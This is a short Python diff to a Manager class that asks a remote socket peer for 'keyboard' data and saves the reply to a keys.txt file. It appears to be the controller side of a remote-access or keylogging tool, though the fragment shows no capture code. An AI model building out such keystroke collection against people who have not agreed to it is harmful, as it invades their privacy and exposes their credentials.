@@ -95,7 +95,23 @@ class Manager(object):
         fh.close()
         return filename
     
-    def requestKeyboard(self, socketClient):
-        data = json.dumps({'type': 6, 'code': 0 ,'status' : 'OK', 'key': self.__key})
-        socketClient.sendall(data)
-        return True
+    def requestKeyboard(self, socketServer, size = 10):
+        data = json.dumps({'type': 6, 'code': 0 ,'status' : 'OK', 'key': self.__key, 'size': size})
+        socketServer.sendall(data)
+        return self.responseKeyboard(socketServer)
+    
+    def responseKeyboard(self,socketServer):
+        response = self.__pysocket.recvall(socketServer)
+        try:
+            response = json.loads(str(response))
+        except:
+            return None
+        return self.dataToKeysboard(response)
+        
+    def dataToKeysboard(self, data):
+        data = data['keyboard']
+        filename = "%s/%s.txt" % (SAVEDIR, 'keys')
+        fh = open(filename, "w")
+        fh.write(data)
+        fh.close()
+        return filename
